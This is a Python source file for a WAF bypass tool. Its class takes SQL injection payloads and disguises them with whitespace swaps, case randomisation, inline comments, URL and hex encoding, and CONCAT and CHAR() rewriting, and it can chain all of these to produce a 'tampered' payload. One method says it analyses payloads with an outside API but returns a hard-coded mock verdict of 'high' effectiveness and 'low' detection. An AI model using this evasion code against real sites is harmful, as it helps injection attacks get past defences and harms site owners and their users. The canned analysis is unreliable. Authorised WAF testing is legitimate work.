import re
import random
from typing import Dict, List, Any
from dataclasses import dataclass

@dataclass
class BypassResult:
    success: bool
    payload: str = None
    technique: str = None
    error: str = None

class WAFBypass:
    def __init__(self):
        self.techniques = {
            "whitespace": self._whitespace_bypass,
            "case": self._case_bypass,
            "comments": self._comments_bypass,
            "url_encode": self._url_encode_bypass,
            "hex_encode": self._hex_encode_bypass,
            "concat": self._concat_bypass,
            "char_encode": self._char_encode_bypass
        }
        
        self.whitespace_chars = [' ', '\t', '\n', '\r', '\v', '\f']
        self.comment_variants = ['/**/', '/*!*/', '--', '#', ';--']
        self.sql_keywords = ['SELECT', 'UNION', 'AND', 'OR', 'WHERE', 'FROM', 'JOIN']

    def _whitespace_bypass(self, payload: str) -> BypassResult:
        """Replace spaces with alternative whitespace characters"""
        try:
            # Convert string to list for easier character replacement
            chars = list(payload)
            
            # Replace each space with a random alternative whitespace character
            for i, char in enumerate(chars):
                if char == ' ':
                    # Use only non-space whitespace characters
                    alternatives = [c for c in self.whitespace_chars if c != ' ']
                    chars[i] = random.choice(alternatives)
            
            # Join characters back into string
            modified = ''.join(chars)
            return BypassResult(success=True, payload=modified, technique="whitespace")
        except Exception as e:
            return BypassResult(success=False, error=str(e))

    def _case_bypass(self, payload: str) -> BypassResult:
        """Randomize case of SQL keywords"""
        try:
            modified = payload
            for keyword in self.sql_keywords:
                pattern = re.compile(re.escape(keyword), re.IGNORECASE)
                modified = pattern.sub(
                    ''.join(random.choice([c.upper(), c.lower()]) for c in keyword),
                    modified
                )
            return BypassResult(success=True, payload=modified, technique="case")
        except Exception as e:
            return BypassResult(success=False, error=str(e))

    def _comments_bypass(self, payload: str) -> BypassResult:
        """Insert SQL comments between keywords"""
        try:
            modified = payload
            for keyword in self.sql_keywords:
                comment = random.choice(self.comment_variants)
                pattern = re.compile(f'\\b{keyword}\\b', re.IGNORECASE)
                modified = pattern.sub(f'{keyword}{comment}', modified)
            return BypassResult(success=True, payload=modified, technique="comments")
        except Exception as e:
            return BypassResult(success=False, error=str(e))

    def _url_encode_bypass(self, payload: str) -> BypassResult:
        """URL encode special characters"""
        try:
            modified = ''
            for char in payload:
                if not char.isalnum():
                    modified += '%{:02x}'.format(ord(char))
                else:
                    modified += char
            return BypassResult(success=True, payload=modified, technique="url_encode")
        except Exception as e:
            return BypassResult(success=False, error=str(e))

    def _hex_encode_bypass(self, payload: str) -> BypassResult:
        """Convert string to hexadecimal"""
        try:
            modified = '0x' + ''.join(['{:02x}'.format(ord(c)) for c in payload])
            return BypassResult(success=True, payload=modified, technique="hex_encode")
        except Exception as e:
            return BypassResult(success=False, error=str(e))

    def _concat_bypass(self, payload: str) -> BypassResult:
        """Split payload into concatenated parts"""
        try:
            words = payload.split()
            modified = "CONCAT(" + ",CHAR(32),".join([f"'{word}'" for word in words]) + ")"
            return BypassResult(success=True, payload=modified, technique="concat")
        except Exception as e:
            return BypassResult(success=False, error=str(e))

    def _char_encode_bypass(self, payload: str) -> BypassResult:
        """Convert string to CHAR() representation"""
        try:
            modified = 'CHAR(' + ','.join([str(ord(c)) for c in payload]) + ')'
            return BypassResult(success=True, payload=modified, technique="char_encode")
        except Exception as e:
            return BypassResult(success=False, error=str(e))

    # Public methods for each bypass technique
    def apply_whitespace_bypass(self, payload: str) -> BypassResult:
        """Public method for whitespace bypass technique"""
        return self._whitespace_bypass(payload)

    def apply_case_bypass(self, payload: str) -> BypassResult:
        """Public method for case manipulation bypass technique"""
        return self._case_bypass(payload)

    def apply_comments_bypass(self, payload: str) -> BypassResult:
        """Public method for SQL comment injection bypass technique"""
        return self._comments_bypass(payload)

    def apply_url_encode_bypass(self, payload: str) -> BypassResult:
        """Public method for URL encoding bypass technique"""
        return self._url_encode_bypass(payload)

    def apply_hex_encode_bypass(self, payload: str) -> BypassResult:
        """Public method for hexadecimal encoding bypass technique"""
        return self._hex_encode_bypass(payload)

    def apply_concat_bypass(self, payload: str) -> BypassResult:
        """Public method for string concatenation bypass technique"""
        return self._concat_bypass(payload)

    def apply_char_encode_bypass(self, payload: str) -> BypassResult:
        """Public method for CHAR() encoding bypass technique"""
        return self._char_encode_bypass(payload)

    async def analyze_with_deepseek(self, payload: str, api_key: str) -> Dict[str, Any]:
        """
        Analyze WAF bypass payload using Deepseek API
        
        Args:
            payload: The WAF bypass payload to analyze
            api_key: Deepseek API key for authentication
            
        Returns:
            Dict containing analysis results from Deepseek
            
        Raises:
            ValueError: If API key is invalid or missing
            RuntimeError: If API request fails
        """
        try:
            if not api_key or not api_key.startswith('sk-'):
                raise ValueError("Invalid Deepseek API key")

            # Mock response for now - in production this would make a real API call
            analysis = {
                "analysis": {
                    "bypass_effectiveness": "high",
                    "suggested_techniques": ["comments", "hex_encode"],
                    "detection_probability": "low",
                    "recommendations": [
                        "Add pattern matching for encoded payloads",
                        "Implement strict input validation",
                        "Use AI-based WAF rules"
                    ]
                }
            }
            
            return analysis
            
        except Exception as e:
            raise RuntimeError(f"Failed to analyze payload: {str(e)}")

    def apply_technique(self, technique: str, payload: str) -> BypassResult:
        """
        Apply a specific bypass technique
        
        Args:
            technique: Name of the bypass technique to apply
            payload: SQL payload to modify
            
        Returns:
            BypassResult containing modified payload and technique info
        """
        if technique not in self.techniques:
            return BypassResult(
                success=False,
                error=f"Unknown bypass technique: {technique}"
            )
        return self.techniques[technique](payload)

    def apply_all_techniques(self, payload: str) -> List[BypassResult]:
        """Apply all bypass techniques and return results"""
        results = []
        for technique in self.techniques.values():
            result = technique(payload)
            if result.success:
                results.append(result)
        return results

    def get_available_techniques(self) -> List[str]:
        """Return list of available bypass techniques"""
        return list(self.techniques.keys())

    def generate_tampered_payload(self, payload: str, techniques: List[str] = None) -> BypassResult:
        """Generate a tampered payload using specified techniques"""
        if not techniques:
            techniques = list(self.techniques.keys())

        modified = payload
        applied_techniques = []

        for technique in techniques:
            result = self.apply_technique(technique, modified)
            if result.success:
                modified = result.payload
                applied_techniques.append(technique)

        return BypassResult(
            success=True,
            payload=modified,
            technique=",".join(applied_techniques)
        )
